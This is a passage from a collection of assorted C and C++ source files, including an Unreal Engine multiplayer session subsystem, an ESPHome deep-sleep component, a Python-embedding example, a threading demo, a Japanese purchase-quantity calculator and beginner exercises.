true;\n\tLastSessionSettings->bAllowJoinViaPresence = true;\n\tLastSessionSettings->bShouldAdvertise = true;\n\tLastSessionSettings->bUseLobbiesIfAvailable = true;\n\tLastSessionSettings->Set(FName(\"MatchType\"), MatchType, EOnlineDataAdvertisementType::ViaOnlineServiceAndPing);\n\n\tconst ULocalPlayer* LocalPlayer = GetWorld()->GetFirstLocalPlayerFromController();\n\tif (!SessionInterface->CreateSession(*LocalPlayer->GetPreferredUniqueNetId(), NAME_GameSession, *LastSessionSettings))\n\t{\n\t\t// Failure occurred. Clear delegate and broadcast to listeners\n\t\tSessionInterface->ClearOnCreateSessionCompleteDelegate_Handle(OnCreateSessionHandle);\n\t\tMultiplayerOnCreateSessionComplete.Broadcast(false);\n\t}\n}\n\nvoid UMultiplayerSessionsSubsystem::FindSessions(int32 MaxSearchResults)\n{\n\tif (!SessionInterface.IsValid())\n\t{\n\t\t// Broadcast failure\n\t\tMultiplayerOnFindSessionsComplete.Broadcast(TArray<FOnlineSessionSearchResult>(), false);\n\t\treturn;\n\t}\n\n\t// Register callback, storing delegate handle for later removal\n\tOnFindSessionsHandle = SessionInterface->AddOnFindSessionsCompleteDelegate_Handle(OnFindSessionsDelegate);\n\n\t// Find sessions\n\tLastSessionSearch = MakeShareable(new FOnlineSessionSearch());\n\tLastSessionSearch->MaxSearchResults = MaxSearchResults;\n\tLastSessionSearch->bIsLanQuery = IOnlineSubsystem::Get()->GetSubsystemName() == \"NULL\" ? true : false;\n\tLastSessionSearch->QuerySettings.Set(SEARCH_PRESENCE, true, EOnlineComparisonOp::Equals);\n\n\tconst ULocalPlayer* LocalPlayer = GetWorld()->GetFirstLocalPlayerFromController();\n\tif (!SessionInterface->FindSessions(*LocalPlayer->GetPreferredUniqueNetId(), LastSessionSearch.ToSharedRef()))\n\t{\n\t\t// Failure occured. Clear delegate and broadcast to listeners\n\t\tSessionInterface->ClearOnFindSessionsCompleteDelegate_Handle(OnFindSessionsHandle);\n\t\tMultiplayerOnFindSessionsComplete.Broadcast(TArray<FOnlineSessionSearchResult>(), false);\n\t}\n}\n\nvoid UMultiplayerSessionsSubsystem::JoinSession(const FOnlineSessionSearchResult& SessionResult)\n{\n\tif (!SessionInterface.IsValid())\n\t{\n\t\t// Broadcast failure\n\t\tMultiplayerOnJoinSessionComplete.Broadcast(EOnJoinSessionCompleteResult::UnknownError);\n\t\treturn;\n\t}\n\n\t// Register callback, storing delegate handle for later removal\n\tOnJoinSessionHandle = SessionInterface->AddOnJoinSessionCompleteDelegate_Handle(OnJoinSessionDelegate);\n\n\t// Join session\n\tconst ULocalPlayer* LocalPlayer = GetWorld()->GetFirstLocalPlayerFromController();\n\tif (!SessionInterface->JoinSession(*LocalPlayer->GetPreferredUniqueNetId(), NAME_GameSession, SessionResult))\n\t{\n\t\t// Failure occurred. Clear delegate and broadcast to listeners\n\t\tSessionInterface->ClearOnJoinSessionCompleteDelegate_Handle(OnJoinSessionHandle);\n\t\tMultiplayerOnJoinSessionComplete.Broadcast(EOnJoinSessionCompleteResult::UnknownError);\n\t}\n\n}\n\nvoid UMultiplayerSessionsSubsystem::DestroySession()\n{\n\tif (!SessionInterface.IsValid())\n\t{\n\t\t// Broadcast failure\n\t\tMultiplayerOnDes",
    "#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n#include <iomanip>\r\n#include <ios>\r\nusing namespace std;\r\n\r\nstruct Goods {\r\n\tstring name;\r\n\tint price;\r\n\tint num;\r\n};\r\n\r\nstatic bool cmp_pri(const Goods& a, const Goods& b) {\r\n\treturn a.price > b.price;\r\n}\r\n\r\nstatic bool cmp_num(const Goods& a, const Goods& b) {\r\n\treturn a.num < b.num;\r\n}\r\n\r\nint main() {\r\n\t//\u30d7\u30ed\u30b0\u30e9\u30e0\u306e\u8aac\u660e\r\n\tcout << \"\u3053\u306e\u30d7\u30ed\u30b0\u30e9\u30e0\u306f\u3001\u6761\u4ef6\u3068\u3057\u3066\u57fa\u6e96\u3068\u306a\u308b\u91d1\u984d\u3068\u305d\u308c\u4ee5\u4e0a\u304b\u4ee5\u4e0b\u304b\u3092\u5b9a\u3081\u308b\u3068\u3001\" << endl;\r\n\tcout << \"\u6761\u4ef6\u306e\u4e2d\u3067\u57fa\u6e96\u3068\u306a\u308b\u91d1\u984d\u306b\u8fd1\u3044\u5408\u8a08\u91d1\u984d\u306b\u306a\u308b\u3088\u3046\u306b\u30b0\u30c3\u30ba\u306e\u8cfc\u5165\u500b\u6570\u3092\u6c42\u3081\u307e\u3059\u3002\" << endl; \r\n\tcout << \"\u203b \u6570\u5024\u3092\u5165\u529b\u3059\u308b\u3068\u304d\u306f\u534a\u89d2\u3067\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n\tcout << \"\u203b \u5165\u529b\u304c\u7d42\u308f\u3063\u305f\u3089 Enter \u3092\u62bc\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n\tcout << endl;\r\n\r\n\r\n\t//\u6761\u4ef6\u306e\u5165\u529b\r\n\t//\u57fa\u6e96\u306e\u91d1\u984d\r\n\tint yosan;\r\n\twhile (true) {\r\n\t\tcout << \"\u57fa\u6e96\u3068\u306a\u308b\u91d1\u984d\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n\t\tcin >> yosan;\r\n\t\tif (cin.fail() || yosan <= 0) {\r\n\t\t\tcout << \"\u5165\u529b\u30a8\u30e9\u30fc\u304c\u767a\u751f\u3057\u307e\u3057\u305f\u3002\" << endl;\r\n\t\t\tcin.clear();\r\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n\t\t}\r\n\t\telse if (yosan > 0)break;\r\n\t}\r\n\tcout << endl;\r\n\r\n\t//\u57fa\u6e96\u4ee5\u4e0a\u304b\u4ee5\u4e0b\u304b\r\n\tcout << \"\u57fa\u6e96\u3068\u306a\u308b\u91d1\u984d\u300c\u4ee5\u4e0a\u300d\u304b\u300c\u4ee5\u4e0b\u300d\u304b\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n\tstring more_or_less;\r\n\twhile (cin >> more_or_less) {\r\n\t\tif (more_or_less == \"\u4ee5\u4e0a\" || more_or_less == \"\u4ee5\u4e0b\")break;\r\n\t\tcout << \"\u5165\u529b\u30a8\u30e9\u30fc\u304c\u767a\u751f\u3057\u307e\u3057\u305f\u3002\" << endl;\r\n\t\tcout << \"\u57fa\u6e96\u3068\u306a\u308b\u91d1\u984d\u300c\u4ee5\u4e0a\u300d\u304b\u300c\u4ee5\u4e0b\u300d\u304b\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n\t}\r\n\tcout << endl;\r\n\r\n\t//\u9001\u6599\u3092\u5165\u529b\r\n\tint postage;\r\n\twhile (true) {\r\n\t\tcout << \"\u9001\u6599\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n\t\tcout << \"\u203b \u9001\u6599\u3092\u542b\u3081\u306a\u3044\u5834\u5408\u306f\u300c0\u300d\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n\t\tcin >> postage;\r\n\t\tif (cin.fail() || postage < 0) {\r\n\t\t\tcout << \"\u5165\u529b\u30a8\u30e9\u30fc\u304c\u767a\u751f\u3057\u307e\u3057\u305f\u3002\" << endl;\r\n\t\t\tcin.clear();\r\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n\t\t}\r\n\t\telse if (postage >= 0)break;\r\n\t}\r\n\tcout << endl;\r\n\r\n\r\n\t//\u8cb7\u3044\u305f\u3044\u5546\u54c1\u60c5\u5831\u3092\u5165\u529b\r\n\tcout << \"\u8cfc\u5165\u3057\u305f\u3044\u30b0\u30c3\u30ba\u306e\u60c5\u5831\u3092\u300c\u540d\u79f0 \u91d1\u984d \u8cfc\u5165\u500b\u6570\u300d\u306e\u69d8\u306b\u534a\u89d2\u30b9\u30da\u30fc\u30b9\u3067\u533a\u5207\u3063\u3066\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n\tcout << \"\u5165\u529b\u3092\u7d42\u4e86\u3059\u308b\u3068\u304d\u306f Ctrl+z \u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n\tcout << \"\u203b \u8cfc\u5165\u500b\u6570\u3092\u6c42\u3081\u305f\u3044\u5546\u54c1\u306f '\u8cfc\u5165\u500b\u6570' \u306e\u6b04\u306b\u300c0\u300d\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n\tcout << \"\u203b \u540d\u79f0\u306f\u6b63\u78ba\u3067\u306a\u304f\u3068\u3082\u304b\u307e\u3044\u307e\u305b\u3093\u304c\u3001\u540c\u3058\u540d\u79f0\u306f\u5165\u529b\u3057\u306a\u3044\u3067\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n\tcout << \"\u203b \u4f8b\uff1a\u300c\u30a2\u30af\u30b9\u30bf 1500 1\u300d,\u300c\u30e9\u30f3\u30c0\u30e0\u7f36\u30d0\u30c3\u30c1 550 0\u300d\" << endl;\r\n\tstring goodsdata;\r\n\tofstream outfile(\"datafile.dat\", ios_base::out);\r\n\twhile (cin >> goodsdata) {\r\n\t\toutfile << goodsdata << endl;\r\n\t}\r\n\toutfile.close();\r\n\tcout << endl;\r\n\r\n\r\n\t//\u8a08\u7b97\u3059\u308b\r\n\tint total = postage;\r\n\tifstream infile(\"datafile.dat\");\r\n\tstring NAME;\r\n\tint PRICE;\r\n\tint NUM;\r\n\tvector<Goods>vec;\r\n\tvec.emplace_back();\r\n\tint x = 0;\r\n\r\n\t//vec\u306b\u5546\u54c1\u60c5\u5831\u3092\u5165\u308c\u3066\u3044\u304f\r\n\twhile (infile >> NAME >> PRICE >> NUM) {\r\n\t\tvec.emplace_back();\r\n\t\tvec[x].name = NAME;\r\n\t\tvec[x].price = PRICE;\r\n\t\tvec[x].num = NUM;\r\n\t\tx += 1;\r\n\t}\r\n\tvec.pop_back();\r\n\tinfile.close();\r\n\tsize_t s1 = vec.size();\r\n\r\n\t//vec\u3092\u500b\u6570\u304c\u5c11\u306a\u3044\u9806\u306b\u4e26\u3079\u308b\r\n\tsort(vec.begin(), vec.end(), cmp_num);\r\n\r\n\t//vec_ran\u306b\u8cfc\u5165\u500b\u6570\u8a08\u7b97\u3059\u308b\u3082\u306e\u3092\u5165\u308c\u308b\r\n\tint ran = 0;\r\n\tfor (int i = 0; i < s1; ++i) {\r\n\t\tif (vec[i].num == 0)ran += 1;\r\n\t}\r\n\tvector<Goods>vec_ran(ran);\r\n\tfor (int j = 0; j < s1; ++j) {\r\n\t\tif (vec[j].num == 0 && vec[j].price > 0) {\r\n\t\t\tvec_ran[j].name = vec[j].name;\r\n\t\t\tvec_ran[j].price = vec[j].price;\r\n\t\t\tvec_ran[j].num = vec[j].num;\r\n\t\t}\r\n\t\ttotal += (vec[j].price * vec[j].num);\r\n\t}\r\n\tsize_t s2 = vec_ran.size();\r\n\r\n\t//vec_ran\u3092\u5024\u6bb5\u304c\u9ad8\u3044\u9806\u306b\u4e26\u3079\u308b\r\n\tsort(vec_ran.begin(), vec_ran.end(), cmp_pri);\r\n\r\n\t//\u8a08\u7b97\t\r\n\tvector<int>counter(yosan / vec_ran[s2 - 1].price);\r\n\tcounter[0] = 0;\r\n\tauto it = counter.begin();\r\n\tint kari = 0;\r\n\tint yobi = 0;\r\n\t//\u4ee5\u4e0a\u306e\u5834\u5408\r\n\tif (more_or_less == \"\u4ee5\u4e0a\") {\r\n\t\tif (total < yosan) {\r\n\t\t\tfor (int p = 0; ++p;) {\r\n\t\t\t\tif (total >= yosan)continue;\r\n\t\t\t\tfor (int q = 0; q < s2; ++q) {\r\n\t\t\t\t\tif (total >= yosan)continue;\r\n\t\t\t\t\tvec_ran[q].num += 1;\r\n\t\t\t\t\ttotal += vec_ran[q].price;\r\n\t\t\t\t\t*it = q;\r\n\t\t\t\t\tyobi = q;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t//\u6761\u4ef6\u306e\u306a\u304b\u3067\u5408\u8a08\u91d1\u984d\u304c\u6700\u5c0f\u306b\u306a\u308b\u3088\u3046\u306b\u8abf\u6574\r\n\t\t\tfor (int r = 0; r < (s2 - yobi); ++r) {\r\n\t\t\t\tif ((total - yosan) < vec_ran[s2 - 1].price)break;\r\n\t\t\t\ttotal -= vec_ran[*(it + r)].price;\r\n\t\t\t\tvec_ran[*(it + r)].num -= 1;\r\n\t\t\t\tfor (int s = 0; ++s;) {\r\n\t\t\t\t\tif (total >= yosan)continue;\r\n\t\t\t\t\tfor (int t = 0; t < s2; ++t) {\r\n\t\t\t\t\t\tif (total >= yosan)continue;\r\n\t\t\t\t\t\tvec_ran[t].num += 1;\r\n\t\t\t\t\t\ttotal += vec_ran[t].price;\r\n\t\t\t\t\t\t*(it + r + 1) = t;\r\n\t\t\t\t\t}\r\n\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tcout << \"\u6761\u4ef6\u306b\u3042\u3046\";\r\n\t\t}\r\n\t\telse {\r\n\t\t\tcout << \"\u8cfc\u5165\u500b\u6570\u304c\u6c7a\u307e\u3063\u3066\u3044\u308b\u30b0\u30c3\u30ba\u306e\u5408\u8a08\u91d1\u984d\u304c\u4e88\u7b97\u3092\u8d85\u3048\u3066\u3044\u307e\u3059\u3002\" << endl;\r\n\t\t}\r\n\t}\r\n\t//\u4ee5\u4e0b\u306e\u5834\u5408\r\n\telse if (more_or_less == \"\u4ee5\u4e0b\") {\r\n\t\tif (total <= yosan) {\r\n\t\t\tfor (int p = 0; ++p;) {\r\n\t\t\t\tif (total <= yosan && (yosan - total) < vec_ran[0].price)continue;\r\n\t\t\t\tfor (int q = 0; q < s2; ++q) {\r\n\t\t\t\t\tif (total < yosan && (yosan - vec_ran[q].price) < total)continue;\r\n\t\t\t\t\tvec_ran[q].num += 1;\r\n\t\t\t\t\ttotal += vec_ran[q].price;\r\n\t\t\t\t\t*it = q;\r\n\t\t\t\t\tyobi = q;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t//\u6761\u4ef6\u306e\u306a\u304b\u3067\u5408\u8a08\u91d1\u984d\u304c\u6700\u5927\u306b\u306a\u308b\u3088\u3046\u306b\u8abf\u6574\r\n\t\t\tfor (int r = 0; r < (s2 - yobi); ++r) {\r\n\t\t\t\tif (total <= yosan && (yosan - vec_ran[s2 - 1].price) < total)break;\r\n\t\t\t\tfor (int s = 0; ++s;) {\r\n\t\t\t\t\tif (total <= yosan && (yosan - total) < vec_ran[*(it + r)].price)continue;\r\n\t\t\t\t\tfor (int t = *(it + r); r < s2; ++t) {\r\n\t\t\t\t\t\tkari = t + 1;\r\n\t\t\t\t\t\tif (total < yosan && (yosan - vec_ran[kari].price) < total)continue;\r\n\t\t\t\t\t\tvec_ran[kari].num += 1;\r\n\t\t\t\t\t\ttotal += vec_ran[kari].price;\r\n\t\t\t\t\t\t*(it + r + 1) = kari;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tcout << \"\u6761\u4ef6\u306b\u3042\u3046\";\r\n\t\t}\r\n\t\telse {\r\n\t\t\tcout << \"\u8cfc\u5165\u500b\u6570\u304c\u6c7a\u307e\u3063\u3066\u3044\u308b\u30b0\u30c3\u30ba\u306e\u5408\u8a08\u91d1\u984d\u304c\u4e88\u7b97\u3092\u8d85\u3048\u3066\u3044\u307e\u3059\u3002\" << endl;\r",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   HumanA.cpp                                         :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: dmeirele <dmeirele@student.42porto.com>    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/08 14:33:23 by dmeirele          #+#    #+#             */\n/*   Updated: 2024/05/08 20:07:24 by dmeirele         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"../include/HumanA.hpp\"\n\nstd::string HumanA::getName()\n{\n\treturn (this->name);\n}\n\nvoid\tHumanA::setName(std::string name)\n{\n\tthis->name = name;\n}\n\nHumanA::~HumanA(){};\n\nHumanA::HumanA(std::string name, Weapon& weapon) : weapon(weapon)\n{\n\tthis->setName(name);\n}\n",
    "#include \"deep_sleep_libretiny.h\"\n#include \"esphome/core/application.h\"\n#include \"esphome/core/log.h\"\n#include <cinttypes>\n\nnamespace esphome {\nnamespace deep_sleep {\nbool global_has_deep_sleep =\n    false; // NOLINT(cppcoreguidelines-avoid-non-const-global-variables)\n}\n\nnamespace deep_sleep_libretiny {\n\nstatic const char *const TAG = \"deep_sleep_libretiny\";\n\noptional<uint32_t> DeepSleepLibretiny::get_run_duration_() const {\n  return this->run_duration_;\n}\n\nvoid DeepSleepLibretiny::setup() {\n  ESP_LOGCONFIG(TAG, \"Setting up Deep Sleep...\");\n  esphome::deep_sleep::global_has_deep_sleep = true;\n\n  const optional<uint32_t> run_duration = get_run_duration_();\n  if (run_duration.has_value()) {\n    ESP_LOGI(TAG, \"Scheduling Deep Sleep to start in %\" PRIu32 \" ms\",\n             *run_duration);\n    this->set_timeout(*run_duration, [this]() { this->begin_sleep(); });\n  } else {\n    ESP_LOGD(TAG,\n             \"Not scheduling Deep Sleep, as no run duration is configured.\");\n  }\n}\nvoid DeepSleepLibretiny::dump_config() {\n  ESP_LOGCONFIG(TAG, \"Setting up Deep Sleep...\");\n  if (this->sleep_duration_.has_value()) {\n    uint32_t duration = *this->sleep_duration_ / 1000;\n    ESP_LOGCONFIG(TAG, \"  Sleep Duration: %\" PRIu32 \" ms\", duration);\n  }\n  if (this->run_duration_.has_value()) {\n    ESP_LOGCONFIG(TAG, \"  Run Duration: %\" PRIu32 \" ms\", *this->run_duration_);\n  }\n  if (this->wakeup_cause_to_run_duration_.has_value()) {\n    ESP_LOGCONFIG(TAG, \"  Default Wakeup Run Duration: %\" PRIu32 \" ms\",\n                  this->wakeup_cause_to_run_duration_->default_cause);\n    ESP_LOGCONFIG(TAG, \"  Touch Wakeup Run Duration: %\" PRIu32 \" ms\",\n                  this->wakeup_cause_to_run_duration_->touch_cause);\n    ESP_LOGCONFIG(TAG, \"  GPIO Wakeup Run Duration: %\" PRIu32 \" ms\",\n                  this->wakeup_cause_to_run_duration_->gpio_cause);\n  }\n  if (wakeup_pins_.size() > 0) {\n    for (WakeUpPinItem item : this->wakeup_pins_) {\n      LOG_PIN(\"  Wakeup Pin: \", item.wakeup_pin);\n    }\n  }\n}\nvoid DeepSleepLibretiny::loop() {\n  if (this->next_enter_deep_sleep_)\n    this->begin_sleep();\n}\nfloat DeepSleepLibretiny::get_loop_priority() const {\n  return -100.0f; // run after everything else is ready\n}\nvoid DeepSleepLibretiny::set_sleep_duration(uint32_t time_ms) {\n  this->sleep_duration_ = uint64_t(time_ms) * 1000;\n}\n\nvoid DeepSleepLibretiny::set_run_duration(\n    WakeupCauseToRunDuration wakeup_cause_to_run_duration) {\n  wakeup_cause_to_run_duration_ = wakeup_cause_to_run_duration;\n}\n\nbool DeepSleepLibretiny::pin_prevents_sleep(WakeUpPinItem &pinItem) {\n  return (pinItem.wakeup_pin_mode == WAKEUP_PIN_MODE_KEEP_AWAKE &&\n          pinItem.wakeup_pin != nullptr && !this->sleep_duration_.has_value() &&\n          (pinItem.wakeup_level == pinItem.wakeup_pin->digital_read()));\n}\n\nvoid DeepSleepLibretiny::set_run_duration(uint32_t time_ms) {\n  this->run_duration_ = time_ms;\n}\nvoid DeepSleepLibretiny::begin_sleep(bool manual) {\n  if (this->prevent_ && !manual) {\n    this->next_enter_deep_sleep_ = true;\n    return;\n  }\n  if (wakeup_pins_.size() > 0) {\n    for (WakeUpPinItem &item : this->wakeup_pins_) {\n      if (pin_prevents_sleep(item)) {\n        // Defer deep sleep until inactive\n        if (!this->next_enter_deep_sleep_) {\n          this->status_set_warning();\n        }\n        ESP_LOGW(TAG,\n                 \"Waiting for pin_ to switch state to enter deep sleep...\");\n        this->next_enter_deep_sleep_ = true;\n        return;\n      }\n    }\n  }\n\n  ESP_LOGI(TAG, \"Beginning Deep Sleep\");\n  if (this->sleep_duration_.has_value()) {\n    ESP_LOGI(TAG, \"Sleeping for %\" PRId64 \"us\", *this->sleep_duration_);\n  }\n  App.run_safe_shutdown_hooks();\n\n  if (this->sleep_duration_.has_value())\n    lt_deep_sleep_config_timer((*this->sleep_duration_ / 1000) & 0xFFFFFFFF);\n  if (wakeup_pins_.size() > 0) {\n    for (WakeUpPinItem &item : this->wakeup_pins_) {\n      if (item.wakeup_pin_mode == WAKEUP_PIN_MODE_INVERT_WAKEUP) {\n        if (item.wakeup_level == item.wakeup_pin->digital_read()) {\n          item.wakeup_level = !item.wakeup_level;\n        }\n      }\n      lt_deep_sleep_config_gpio(1 << item.wakeup_pin->get_pin(),\n                                item.wakeup_level);\n    }\n  }\n  lt_deep_sleep_enter();\n}\nfloat DeepSleepLibretiny::get_setup_priority() const {\n  return setup_priority::DATA;\n}\nvoid DeepSleepLibretiny::prevent_deep_sleep() { this->prevent_ = true; }\nvoid DeepSleepLibretiny::allow_deep_sleep() { this->prevent_ = false; }\n\n} // namespace deep_sleep_libretiny\n} // namespace esphome\n",
    "#include <iostream>\n#include <Python.h>\n\n\n// Function to print sys.path\nvoid print_sys_path() {\n    PyRun_SimpleString(\n        \"import sys\\n\"\n        \"print('Current sys.path:')\\n\"\n        \"for path in sys.path:\\n\"\n        \"    print(path)\\n\"\n    );\n}\n\n// Function to call the Python function 'load' in the given module\nPyObject* call_load_function(const std::string& module_name, const int argument) {\n    // Initialize the Python interpreter\n    Py_Initialize();\n\n    // Add the directory containing the module to the Python path\n    PyRun_SimpleString(\"import sys\");\n    PyRun_SimpleString(\"sys.path.append('../extensions/')\");  // replace with actual path\n\n    // Print sys.path to verify\n    print_sys_path();\n\n    // Import the module\n    PyObject* pName = PyUnicode_DecodeFSDefault(module_name.c_str());\n    PyObject* pModule = PyImport_Import(pName);\n    Py_DECREF(pName);\n\n    if (pModule == nullptr) {\n        PyErr_Print();\n        throw std::runtime_error(\"Failed to load the Python module\");\n    }\n\n    // Get the 'load' function from the module\n    PyObject* pFunc = PyObject_GetAttrString(pModule, \"load\");\n    if (!pFunc || !PyCallable_Check(pFunc)) {\n        if (PyErr_Occurred())\n            PyErr_Print();\n        Py_XDECREF(pFunc);\n        Py_DECREF(pModule);\n        throw std::runtime_error(\"Cannot find function 'load'\");\n    }\n\n    // Call the 'load' function\n    PyObject* pArgs = PyTuple_Pack(1, PyLong_FromLong(argument));\n    PyObject* pValue = PyObject_CallObject(pFunc, pArgs);\n    Py_DECREF(pArgs);\n    Py_DECREF(pFunc);\n    Py_DECREF(pModule);\n\n    if (pValue == nullptr) {\n        PyErr_Print();\n        throw std::runtime_error(\"Call to 'load' failed\");\n    }\n\n    return pValue; // Return the result\n}\n\nvoid process_module_data(PyObject* module_data) {\n    PyObject* pTook = PyObject_GetAttrString(module_data, \"took\");\n    PyObject* pResult = PyObject_GetAttrString(module_data, \"result\");\n\n    if (pTook && PyLong_Check(pTook) && pResult && PyLong_Check(pResult)) {\n        long took = PyLong_AsLong(pTook);\n        long result = PyLong_AsLong(pResult);\n        std::cout << \"Result from Python: took = \" << took << \" microseconds, result = \" << result << std::endl;\n    } else {\n        std::cerr << \"Invalid data in ModuleData\" << std::endl;\n    }\n\n    Py_XDECREF(pTook);\n    Py_XDECREF(pResult);\n}\n\nint main()  {\n    try {\n        PyObject *result = call_load_function(\"extension\", 20);\n        process_module_data(result);\n    }\n    catch(const std::runtime_error &e) {\n    std::cerr << \"Error: \" << e.what() << std::endl;\n    }\n    Py_Finalize();\n    return 0;\n}\n",
    "#include <iostream>\n#include <thread>\n#include <chrono>\n\n#include \"OSCompatible.h\"\n\n\n\n// Example function\nint exampleFunction(int a, double b)\n{\n    std::this_thread::sleep_for(std::chrono::milliseconds(900));\n\n    std::cout << \"Function called with arguments: \" << a << \", \" << b << std::endl;\n\n    return a + static_cast<int>(b);\n}\n\n\nvoid voidFunction(int a)\n{\n    std::this_thread::sleep_for(std::chrono::milliseconds(900));\n\n    std::cout << \"Void function called with argument: \" << a << std::endl;\n}\n\nbool boolFunction(int a)\n{\n    std::this_thread::sleep_for(std::chrono::milliseconds(900));\n\n    std::cout << \"Void function called with argument: \" << a << std::endl;\n    return true;\n}\n\n\n\n\nint main()\n{\n    // Create and start the thread for a function with a return value\n    OSCompatible::thread thread1(exampleFunction, 42, 3.14);\n    std::cout<< \"Thread 1 started\" << std::endl;\n    thread1.join();\n\n    // Retrieve the result\n    std::any result = thread1.getResult();\n    if (result.has_value())\n    {\n        std::cout << \"Result: \" << std::any_cast<int>(result) << std::endl;\n    }\n\n    // Create and start the thread for a void function\n    OSCompatible::thread thread2(voidFunction, 42);\n    std::cout<< \"Thread 2 started\" << std::endl;\n    thread2.join();\n\n    // No result to retrieve for void function\n    std::any voidResult = thread2.getResult();\n    if (!voidResult.has_value())\n    {\n        std::cout << \"Void function completed successfully\" << std::endl;\n    }\n\n    // Create and start the thread for a void function\n    OSCompatible::thread thread3(boolFunction, 4277);\n\n    thread3.join();\n\n    // No result to retrieve for void function\n    std::any boolResult = thread3.getResult();\n    if (boolResult.has_value())\n    {\n        std::cout << \"Result: \" << std::any_cast<bool>(boolResult) << std::endl;\n    }\n\n\n    // Create thread with custom properties (priority, policy, affinity)\n    OSCompatible::thread::Properties properties = {\n        OSCompatible::thread::DEFAULT_PRIORITY,\n        OSCompatible::thread::DEFAULT_POLICY,\n        OSCompatible::thread::DEFAULT_AFFINITY\n    };\n\n    // Create and start the thread for a void function\n    OSCompatible::thread thread4(properties, boolFunction, 4277);\n\n    thread4.join();\n\n    // No result to retrieve for void function\n    std::any boolResult2 = thread4.getResult();\n    if (boolResult2.has_value())\n    {\n        std::cout << \"Result: \" << std::any_cast<bool>(boolResult2) << std::endl;\n    }\n\n    return 0;\n}\n\n\n\n",
    "#include <iostream>\n#include <vector>\n#include <iomanip>\n#include <ctime>\n\n// void happyBirthday(std::string name, int age);\n// int main() {\n\n//     std::string name = \"Dawns\";\n//     int age = 19;\n//     happyBirthday(name, age);\n\n//     return 0;\n// }\n\n// void happyBirthday(std::string dude, int age){\n//     std::cout << \"Happy birthday to \" << dude << \"\\n\";\n//     std::cout << \"Happy birthday to \" << dude << \"\\n\";\n//     std::cout << \"Happy birthday to \" << dude << \"\\n\";\n//     std::cout << \"Your age is \" << age << \" years old\" << \"\\n\";\n// }\n\n\n\n// // **********************lesson 26: return keyword\n//     std::string concatStrings(std::string string1, std::string string2);\n//     int main() {\n//         std::string firstName = \"Dustin\";\n//         std::string lastName = \"Levin\";\n//         std::string fullName = concatStrings(firstName, lastName);\n\n//         std::cout << \"What's been up \" << fullName;\n//         return 0;\n//     }\n\n//     std::string concatStrings(std::string string1, std::string string2){\n//         return string1 + \" \" + string2;\n//     }\n\n\n\n// 27\n// int myNum = 5;\n\n// void printNum();\n\n// int main() {\n//     int myNum = 15;\n//     printNum();\n//     std::cout << ::myNum << '\\n';\n// }\n\n// void printNum(){\n//     int myNum = 4;\n//     std::cout << ::myNum << '\\n';\n// }\n\n\n\n\n\n\n\n// **************** /////// BANKING PRACTICE PROGRAM ///////*******************\n\n\n\n// void showBalance(double balance);\n// double deposit();\n// double withdraw(double balance);\n\n// int main() {\n//     double balance = 82000;\n//     int choice = 0;\n//     std::cin.clear();\n//     fflush(stdin);\n\n//     do\n//     {\n//         std::cout << \"-----------------------------\\n\";\n//     std::cout << \"Welcome to Irvin Council Bank\\n\";\n//     std::cout << \"-----------------------------\\n\";\n//     std::cout << \"\\n\";\n//     std::cout << \"Please Enter Your Choice: \\n\";\n//     std::cout << \"\\n\";\n//     std::cout << \"1.Show Balance\\n\";\n//     std::cout << \"2.Deposit Your Money\\n\";\n//     std::cout << \"3.Withdraw Your Money\\n\";\n//     std::cout << \"4.Exit\\n\";\n//     std::cin >> choice;\n\n//     switch (choice)\n//     {\n//     case 1:\n//         showBalance(balance);\n//         break;\n    \n//     case 2:\n//         balance += deposit();\n//         showBalance(balance);\n//         break;\n\n//     case 3:\n//         balance -= withdraw(balance);\n//         showBalance(balance);\n//         break;\n\n//     case 4:\n//         std::cout << \"Thank's for visiting.\\n\";\n//         break;\n\n    \n//     default:\n//         std::cout << \"That's Invalid Choice !\\n\";\n//         break;\n//     }\n\n//     } while (choice != 4);\n    \n\n// }\n\n// void showBalance(double balance){\n//     std::cout << \"\\n\";\n//     std::cout << \"Your available Balance is: $\" << std::setprecision(2) << std::fixed << balance << \"\\n\";\n//     std::cout << \"\\n\";\n// }\n// double deposit(){\n//     double amount = 0;\n\n//     std::cout << \"Please enter amount to be deposited: \\n\";\n//     std::cin >> amount;\n\n//     if (amount > 0)\n//     {\n//         return amount;\n//     }\n//     else {\n//         std::cout << \"That's not a valid amount to be deposited !\\n\";\n//                 return 0;\n//     }\n    \n// }\n// double withdraw(double balance){\n//     double amount = 0;\n\n\n//     std::cout << \"Please enter amount to be Withdrawn: \\n\";\n//     std::cin >> amount;\n\n//     if (amount > balance)\n//     {\n//         std::cout << \"Insufficient !\\n\";\n//         return 0;\n//     }\n//     else if (amount < 0)\n//     {\n//         std::cout << \"That's not a valid amount to be Withdrawn !\\n\";\n//                 return 0;\n//     }\n    \n//     else {\n//         return amount;\n//     }\n// }\n\n\n\n\n\n\n\n\n\n\n\n\n\n// GAME 1\n\n// char getUserChoice();\n// 